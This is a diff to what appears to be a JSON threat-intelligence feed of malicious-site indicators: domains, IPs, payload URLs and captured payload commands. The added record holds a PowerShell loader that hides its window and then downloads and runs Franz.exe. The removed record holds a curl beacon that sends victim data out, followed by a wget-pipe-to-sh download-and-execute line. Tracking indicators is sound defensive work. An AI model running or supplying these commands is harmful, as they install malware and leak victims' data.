@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "canakkaleweb-tasarim.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "172.67.147.92"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmww9msi40h9z0nmltnw91xnl",
+    "ScannedAt": "2026-11-25T15:15:42.220000+00:00"
+  },
+  {
     "UrlDomain": "sandyshoresafricasafaris.com",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -5884,31 +5903,5 @@
     ],
     "ReportId": "cmwmcr24e1slr0omlt0ye13yq",
     "ScannedAt": "2026-11-18T16:45:18.406000+00:00"
-  },
-  {
-    "UrlDomain": "www.sparkinnovationmarketing.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "script.google.com",
-      "script-six-tawny.vercel.app",
-      "2fwww.sparkinnovationmarketing.com"
-    ],
-    "PayloadUrl": [
-      "https://script-six-tawny.vercel.app/lin",
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/win",
-      "https://script-six-tawny.vercel.app/mac"
-    ],
-    "IP": [
-      "162.241.24.185"
-    ],
-    "Related": [],
-    "Payload": "curl -sL -d \"id=797da23a-d6ff-412b-a4bf-aaf3610132c2&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]sparkinnovationmarketing[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-18T15%3A19%3A30.050Z&lastShellAt=2026-11-18T15%3A19%3A30.050Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
-    "ResolvedDownloadUrl": [
-      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
-      "https://script-six-tawny.vercel.app/lin"
-    ],
-    "ReportId": "cmwm9qkdy1sib0oml3v2ixmyu",
-    "ScannedAt": "2026-11-18T15:20:56.547000+00:00"
   }
 ]
